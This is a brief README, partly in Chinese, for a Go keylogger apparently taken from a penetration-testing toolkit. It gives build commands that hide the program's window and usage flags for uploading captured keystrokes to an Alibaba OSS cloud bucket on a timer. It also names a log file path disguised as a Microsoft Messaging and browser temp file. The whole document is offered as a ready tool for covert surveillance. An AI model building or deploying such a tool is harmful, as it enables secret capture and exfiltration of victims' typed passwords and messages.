# keylogger

## Compile

```
go mod download    # Use Proxy If you are in China!
go build -trimpath -ldflags "-s -w -H=windowsgui" key.go
```

### Usage

不加参数直接运行不上传键盘记录内容，为了防止ak泄露，上传oss功能慎用~

```
> keylogger.exe -h

Usage of keylogger.exe:
  -o string
        format: bucketName:accessKeyId:accessKeySecret:endpoint
  -t int
        Upload interval,default: 60min (default 60)
```

## Data

```
C:\Users\<USERNAME>\AppData\Local\Packages\Microsoft.Messaging\360se_temp.tmp
```

### References
https://github.com/mabangde/pentesttools/blob/master/golang/keylogger.go
